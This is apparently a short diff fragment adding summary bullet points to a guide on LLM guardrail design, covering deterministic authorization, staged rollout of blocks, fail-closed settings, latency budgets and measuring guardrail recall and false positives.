+- Enforce authorization, tool allowlists, and SQL policies in deterministic code and infrastructure, never in the LLM prompt.
+- Block synchronously only when detections are precise or actions are irreversible, and promote new guardrails through `shadow -> flag -> block`.
+- Configure fail-closed behavior for confidentiality, authorization, and irreversible actions, and use fail-open with alerts for brand or tone checks.
+- Allocate a latency budget per layer, scan static documents at indexing time, and gate tool calls before execution.
+- Measure recall and false-positive rate for every guardrail using both adversarial and benign-but-tricky datasets.
 
 ## Further reading
 
